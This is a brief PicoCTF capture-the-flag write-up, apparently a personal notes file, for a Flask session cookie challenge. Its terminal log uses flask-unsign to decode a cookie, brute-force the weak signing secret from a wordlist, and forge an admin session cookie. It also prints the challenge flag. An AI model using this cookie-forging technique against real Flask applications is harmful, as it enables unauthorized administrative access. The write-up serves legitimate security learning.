# Retos PicoCTF


## Objetivo 

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py) [http://mercury.picoctf.net:52134/](http://mercury.picoctf.net:52134/)
## Solución 

```
jesus@jesus-ThinkPad-T420:~$ flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zvy78w.1vnhMwoH6QX-VTHzdgy7KzuK0V4"
{'very_auth': 'blank'}
jesus@jesus-ThinkPad-T420:~$ cd  picoctfretos/
jesus@jesus-ThinkPad-T420:~/picoctfretos$ nano 


Use «fg» para volver a nano.

[1]+  Detenido                nano
jesus@jesus-ThinkPad-T420:~/picoctfretos$ nano 
jesus@jesus-ThinkPad-T420:~/picoctfretos$ flask-unsign --unsing --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zvy78w.1vnhMwoH6QX-VTHzdgy7KzuK0V4" galletas.txt
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET] [--salt SALT] [--wordlist WORDLIST] [--threads THREADS]
                    [--no-literal-eval] [--server SERVER] [--insecure] [-o OUTPUT] [-p PROXY] [--cookie-name COOKIE_NAME] [-U USER_AGENT]
                    [-q] [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: --unsing galletas.txt
jesus@jesus-ThinkPad-T420:~/picoctfretos$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zvy78w.1vnhMwoH6QX-VTHzdgy7KzuK0V4" galletas.txt
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET] [--salt SALT] [--wordlist WORDLIST] [--threads THREADS]
                    [--no-literal-eval] [--server SERVER] [--insecure] [-o OUTPUT] [-p PROXY] [--cookie-name COOKIE_NAME] [-U USER_AGENT]
                    [-q] [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: galletas.txt
jesus@jesus-ThinkPad-T420:~/picoctfretos$ ls
galletas.txt  webshell.png.php
jesus@jesus-ThinkPad-T420:~/picoctfretos$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zvy78w.1vnhMwoH6QX-VTHzdgy7KzuK0V4" --wordlist galletas.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
jesus@jesus-ThinkPad-T420:~/picoctfretos$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvy9yQ.PFUj6b77IM3-Ff_lRIidZ3mMvfY
jesus@jesus-ThinkPad-T420:~/picoctfretos$ 

**Flag**: `picoCTF{pwn_4ll_th3_cook1E5_478da04c}`

```

## Notas adicionales 

## Referencias 
